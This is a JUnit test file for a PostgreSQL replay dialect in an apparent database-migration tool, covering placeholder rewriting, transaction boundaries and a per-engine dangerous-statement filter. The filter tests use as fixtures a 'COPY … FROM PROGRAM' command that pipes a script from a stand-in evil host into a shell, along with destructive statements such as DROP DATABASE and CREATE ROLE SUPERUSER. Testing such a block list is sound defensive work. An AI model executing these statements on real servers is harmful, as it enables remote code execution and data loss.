package com.migration.traffic;

import com.migration.traffic.model.StatementClass;
import com.migration.traffic.model.TrafficEngine;
import com.migration.traffic.replay.DangerousStatementFilter;
import com.migration.traffic.replay.dialect.PreparedPlan;
import com.migration.traffic.replay.dialect.TargetDialect;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

@DisplayName("PG 回放方言")
class PgReplayTest {

    private final TargetDialect pg = TargetDialect.of(TrafficEngine.POSTGRESQL);

    @Nested
    @DisplayName("占位符改写（$n → ?）")
    class Placeholders {

        @Test
        @DisplayName("基本改写 —— 不改写的话 pgjdbc 找不到任何参数标记，报『栏位数：0』")
        void basic() {
            PreparedPlan p = pg.prepare("INSERT INTO t VALUES ($1,$2,$3)",
                    Arrays.asList("1", null, "x"));
            assertEquals("INSERT INTO t VALUES (?,?,?)", p.sql());
            assertEquals(Arrays.asList("1", null, "x"), p.binds());
        }

        @Test
        @DisplayName("重复引用要展开成多个绑定值")
        void repeatedParam() {
            PreparedPlan p = pg.prepare("SELECT * FROM t WHERE a=$1 OR b=$1", List.of("v"));
            assertEquals("SELECT * FROM t WHERE a=? OR b=?", p.sql());
            assertEquals(List.of("v", "v"), p.binds());
        }

        @Test
        @DisplayName("字符串字面量里的 $1 不是占位符 —— 改了就把语句本身改坏了")
        void insideStringLiteral() {
            PreparedPlan p = pg.prepare("SELECT '$1' , $1", List.of("v"));
            assertEquals("SELECT '$1' , ?", p.sql());
            assertEquals(List.of("v"), p.binds());
        }

        @Test
        @DisplayName("美元引用块（$$…$$）整段不动")
        void dollarQuoted() {
            String sql = "DO $$ BEGIN PERFORM 1; END $$";
            assertEquals(sql, pg.prepare(sql, null).sql());
            PreparedPlan p = pg.prepare("SELECT $fn$ has $1 inside $fn$, $1", List.of("v"));
            assertEquals("SELECT $fn$ has $1 inside $fn$, ?", p.sql());
        }

        @Test
        @DisplayName("注释与双引号标识符里的 $1 不动")
        void commentsAndIdentifiers() {
            PreparedPlan p = pg.prepare("SELECT \"col$1\" -- $1 in comment\n , $1", List.of("v"));
            assertTrue(p.sql().contains("\"col$1\""));
            assertTrue(p.sql().contains("-- $1 in comment"));
            assertTrue(p.sql().trim().endsWith("?"));
        }

        @Test
        @DisplayName("序号越界补 NULL，绝不把上一个参数的值顺延过去（那是静默写错数据）")
        void outOfRangeBecomesNull() {
            PreparedPlan p = pg.prepare("SELECT $1, $2", List.of("only-one"));
            assertEquals(Arrays.asList("only-one", null), p.binds());
        }

        @Test
        @DisplayName("没有占位符时原样返回")
        void noPlaceholders() {
            PreparedPlan p = pg.prepare("SELECT 1", null);
            assertEquals("SELECT 1", p.sql());
            assertNull(p.binds());
        }
    }

    @Nested
    @DisplayName("危险语句黑名单按引擎分")
    class Dangerous {

        @Test
        @DisplayName("COPY … FROM PROGRAM 必拦：它在数据库服务器上执行任意 shell 命令")
        void copyProgram() {
            assertNotNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL,
                    "COPY t FROM PROGRAM 'curl evil.sh | sh'"));
            assertNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL,
                    "COPY t FROM STDIN"), "普通 COPY 是正常业务语句");
        }

        @Test
        @DisplayName("PG 独有的破坏性语句")
        void pgSpecific() {
            assertNotNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL, "ALTER SYSTEM SET x=1"));
            assertNotNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL, "DROP DATABASE prod"));
            assertNotNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL, "DROP SCHEMA public CASCADE"));
            assertNotNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL,
                    "SELECT pg_terminate_backend(123)"));
            assertNotNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL,
                    "CREATE ROLE r SUPERUSER"));
        }

        @Test
        @DisplayName("普通业务语句不能被误伤")
        void ordinary() {
            for (String sql : new String[]{
                    "SELECT * FROM t", "INSERT INTO t VALUES (1)", "DROP TABLE t",
                    "CREATE INDEX i ON t(a)", "TRUNCATE t", "CREATE ROLE r LOGIN"}) {
                assertNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL, sql), sql);
            }
        }

        @Test
        @DisplayName("MySQL 的黑名单不该套到 PG 上（反之亦然）")
        void notCrossApplied() {
            assertNull(DangerousStatementFilter.match(TrafficEngine.MYSQL,
                    "COPY t FROM PROGRAM 'x'"), "MySQL 没有 COPY PROGRAM 这回事");
            assertNull(DangerousStatementFilter.match(TrafficEngine.POSTGRESQL,
                    "SET GLOBAL max_connections=1"), "PG 没有 SET GLOBAL");
        }
    }

    @Nested
    @DisplayName("事务边界与会话模型")
    class Session {

        @Test
        @DisplayName("PG 的 END 等于 COMMIT")
        void endIsCommit() {
            assertEquals(TargetDialect.TxEffect.OPEN, pg.txEffect("BEGIN", StatementClass.TCL));
            assertEquals(TargetDialect.TxEffect.CLOSE, pg.txEffect("END", StatementClass.TCL));
            assertEquals(TargetDialect.TxEffect.CLOSE, pg.txEffect("COMMIT", StatementClass.TCL));
        }

        @Test
        @DisplayName("PG 的连接与库绑定：换库只能换连接")
        void connectionBoundToDatabase() {
            assertTrue(pg.connectionBoundToDatabase());
            assertEquals("5432", pg.defaultPort());
        }
    }
}
